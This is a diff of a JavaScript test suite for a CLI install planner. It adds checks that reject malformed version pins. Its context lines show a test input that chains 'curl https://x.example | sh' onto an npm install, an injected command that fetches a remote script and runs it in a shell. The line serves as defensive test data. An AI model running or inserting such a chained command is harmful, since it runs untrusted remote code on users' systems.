@@ -107,6 +107,17 @@ describe('planCliInstall', () => {
         });
     });
 
+    it('refuses a package spec that only contains a pin somewhere in it', () => {
+        for (const install of [
+            'npm install -g lintkit@2.4.1x',
+            'npm install -g lintkit@2.4.1@latest',
+            'npm install -g lintkit@latest-2.4.1',
+            'pip install lintkit==2.4.1x',
+        ]) {
+            expect(planCliInstall(cli({ install })).ok).toBe(false);
+        }
+    });
+
     it('refuses shell syntax that would chain a second command', () => {
         for (const install of [
             'npm install -g lintkit@2.4.1; curl https://x.example | sh',
